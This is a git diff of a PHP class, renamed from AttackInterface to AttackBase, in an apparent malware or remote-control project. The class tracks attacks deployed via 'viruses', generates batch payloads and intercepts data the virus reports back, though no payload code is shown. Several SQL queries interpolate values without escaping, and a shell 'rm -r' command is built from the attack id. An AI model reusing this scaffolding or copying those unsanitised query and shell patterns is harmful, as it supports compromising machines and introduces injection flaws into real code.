@@ -1,18 +1,15 @@
 <?php /** @noinspection PhpIncludeInspection */
 
-/** @noinspection PhpUndefinedMethodInspection */
-
 namespace Kelvinho\Virus\Attack;
 
-use Kelvinho\Virus\Logs;
 use Kelvinho\Virus\Network\RequestData;
-use Kelvinho\Virus\Session;
+use Kelvinho\Virus\Session\Session;
+use Kelvinho\Virus\User\UserFactory;
 use Kelvinho\Virus\Virus\VirusFactory;
 use function Kelvinho\Virus\db;
 
 /**
- * Class AttackInterface
- * @package Kelvinho\Virus\Attack
+ * Abstract class AttackBase. All attacks should subclass this.
  *
  * Represents an attack. The representation of this will be stored in table attacks, and the data stored on disk is at:
  * DATA_FILE/attacks/{attack_id}/
@@ -20,8 +17,13 @@ use function Kelvinho\Virus\db;
  * Currently, these are stored on disk:
  * - Profile text, at /profile.txt
  * - Additional info, at /state.json, utilized by subclasses
+ *
+ * @package Kelvinho\Virus\Attack
+ * @author Quang Ho <157239q@gmail.com>
+ * @copyright Copyright (c) 2020 Quang Ho <https://github.com/157239n>
+ * @license http://www.opensource.org/licenses/mit-license.html  MIT License
  */
-abstract class AttackInterface {
+abstract class AttackBase {
     public const STATUS_DORMANT = "Dormant";
     public const STATUS_EXECUTED = "Executed";
     public const STATUS_DEPLOYED = "Deployed";
@@ -37,19 +39,19 @@ abstract class AttackInterface {
     protected Session $session;
     protected VirusFactory $virusFactory;
     protected AttackFactory $attackFactory;
+    protected UserFactory $userFactory;
 
     function __construct() {
     }
 
-    /** @noinspection PhpUnused */
-    function setContext(RequestData $requestData, Session $session, VirusFactory $virusFactory, AttackFactory $attackFactory) {
+    function setContext(RequestData $requestData, Session $session, UserFactory $userFactory, VirusFactory $virusFactory, AttackFactory $attackFactory) {
         $this->requestData = $requestData;
         $this->session = $session;
+        $this->userFactory = $userFactory;
         $this->virusFactory = $virusFactory;
         $this->attackFactory = $attackFactory;
     }
 
-    /** @noinspection PhpUnused */
     function setAttackId(string $attack_id): void {
         $this->attack_id = $attack_id;
     }
@@ -58,7 +60,6 @@ abstract class AttackInterface {
         return $this->attack_id;
     }
 
-    /** @noinspection PhpUnused */
     public function setStatus(string $status): void {
         $this->status = $status;
     }
@@ -87,7 +88,6 @@ abstract class AttackInterface {
         return $this->profile;
     }
 
-    /** @noinspection PhpUnused */
     function setPackageDbName(string $packageDbName): void {
         $this->packageDbName = $packageDbName;
     }
@@ -96,17 +96,16 @@ abstract class AttackInterface {
         return $this->packageDbName;
     }
 
-    public function getVirusId(): string {
-        return $this->virus_id;
-    }
-
-    /** @noinspection PhpUnused */
     function setVirusId(string $virus_id): void {
         $this->virus_id = $virus_id;
     }
 
+    public function getVirusId(): string {
+        return $this->virus_id;
+    }
+
     /**
-     * This will generate the intercept code that will be used to take the reported data back from the virus.
+     * This will generate the intercept code that will be used to take the reported data back from the virus. TODO: delete this
      */
     public function generateIntercept(): string {
         return "";
@@ -120,33 +119,14 @@ abstract class AttackInterface {
     abstract protected function setState(string $json): void;
 
     /**
-     * This will load the state of this attack using the file /data/attacks/{attack_id}/state.json. Also loads from database.
-     * Storing information in 2 places may seem inconvenient and makes you question "Why?", but some common denominator of
-     * attacks should be placed in the database.
-     * @param string|null $attack_id Optional attack id. This is used for making sure the attack representation is created okay when initializing
-     * @noinspection PhpUnused
+     * This will load the state of this attack using the file /data/attacks/{attack_id}/state.json
+     * Also loads the profile.
+     *
+     * @internal Should only be used by AttackFactory
      */
-    public function loadState(string $attack_id = null): void {
-        if ($attack_id == null) {
-            $attack_id = $this->attack_id;
-        }
-        $this->setState(file_get_contents(DATA_FILE . "/attacks/$attack_id/state.json"));
-        $this->setProfile(file_get_contents(DATA_FILE . "/attacks/$attack_id/profile.txt"));
-        /*
-        $mysqli = db();
-        if ($mysqli->connect_errno) {
-            Logs::logMysql($mysqli->connect_error);
-        }
-        $answer = $mysqli->query("select name, attack_package, virus_id, status, executed_time from attacks where attack_id = \"$attack_id\"")->fetch_assoc();
-        $this->packageDbName = $answer["attack_package"];
-        if (!in_array($answer["status"], self::STATUSES)) {
-            trigger_error("Status can't have value " . $answer["status"] . "!");
-        }
-        $this->status = $answer["status"];
-        $this->virus_id = $answer["virus_id"];
-        $this->name = $answer["name"];
-        $this->executed_time = $answer["executed_time"];
-        $mysqli->close();/**/
+    public function loadFromDisk(): void {
+        $this->setState(file_get_contents(DATA_FILE . "/attacks/$this->attack_id/state.json"));
+        $this->setProfile(file_get_contents(DATA_FILE . "/attacks/$this->attack_id/profile.txt"));
     }
 
     /**
@@ -157,24 +137,19 @@ abstract class AttackInterface {
     abstract protected function getState(): string;
 
     /**
-     * This will save the state of this attack using the file /data/attacks/{attack_id}/state.json. Also saves to database.
-     *
-     * @param string|null $attack_id Optional attack id. This is used for making sure the attack representation is created okay when initializing
+     * This will save the state of everything about this attack.
      */
-    public function saveState(string $attack_id = null): void {
-        if ($attack_id == null) {
-            $attack_id = $this->attack_id;
-        }
-        file_put_contents(DATA_FILE . "/attacks/$attack_id/state.json", $this->getState());
-        file_put_contents(DATA_FILE . "/attacks/$attack_id/profile.txt", $this->getProfile());
+    public function saveState(): void {
+        file_put_contents(DATA_FILE . "/attacks/$this->attack_id/state.json", $this->getState());
+        file_put_contents(DATA_FILE . "/attacks/$this->attack_id/profile.txt", $this->getProfile());
         $mysqli = db();
-        if ($mysqli->connect_errno) Logs::mysql($mysqli->connect_error);
-        $mysqli->query("update attacks set status = \"$this->status\", name = \"" . $mysqli->escape_string($this->name) . "\", status = \"$this->status\", executed_time = $this->executed_time where attack_id = \"$attack_id\"");
+        $mysqli->query("update attacks set status = \"$this->status\", name = \"" . $mysqli->escape_string($this->name) . "\", status = \"$this->status\", executed_time = $this->executed_time where attack_id = \"$this->attack_id\"");
         $mysqli->close();
     }
 
     /**
-     * This is expected to call BaseScript::payloadConfirmationLoop() to generate the appropriate payload confirmation loop.
+     * This should generate the actual batch code to be run as payload.
+     * Expected (but not required) to call BaseScript::payloadConfirmationLoop() to generate the appropriate payload confirmation loop.
      *
      * @return string
      */
@@ -183,12 +158,12 @@ abstract class AttackInterface {
     /**
      * This will include some extra resources that the attack might need. Things like other scripts and configs.
      *
-     * @param string $resource The resource name
+     * @param string $resourceIdentifier The resource name
      */
-    abstract public function processExtras(string $resource): void;
+    abstract public function processExtras(string $resourceIdentifier): void;
 
     public function render(): void {
-        Renderer::render(PackageRegistrar::getLocation($this->packageDbName), $this->session, $this->attackFactory);
+        AttackRenderer::render($this, $this->session, $this->userFactory);
     }
 
     /**
@@ -236,19 +211,21 @@ abstract class AttackInterface {
         return $this->executed_time;
     }
 
-    /** @noinspection PhpUnused */
-    function setExecutedTime(int $executedTime): void {
+    /**
+     * Sets the executed time.
+     *
+     * @param int $executedTime
+     * @internal Should only be used by AttackFactory
+     */
+    public function setExecutedTime(int $executedTime): void {
         $this->executed_time = $executedTime;
     }
 
     /**
-     * Deletes permanently the attack.
+     * Deletes the attack permanently.
      */
     public function delete(): void {
         $mysqli = db();
-        if ($mysqli->connect_errno) {
-            Logs::mysql($mysqli->connect_error);
-        }
         $mysqli->query("delete from attacks where attack_id = \"$this->attack_id\"");
         $mysqli->close();
         exec("rm -r " . DATA_FILE . "/attacks/$this->attack_id");
@@ -262,9 +239,6 @@ abstract class AttackInterface {
      */
     public static function exists(string $attack_id): bool {
         $mysqli = db();
-        if ($mysqli->connect_errno) {
-            Logs::mysql($mysqli->connect_error);
-        }
         $answer = $mysqli->query("select attack_id from attacks where attack_id = \"" . $mysqli->escape_string($attack_id) . "\"");
         $mysqli->close();
         if ($answer) {
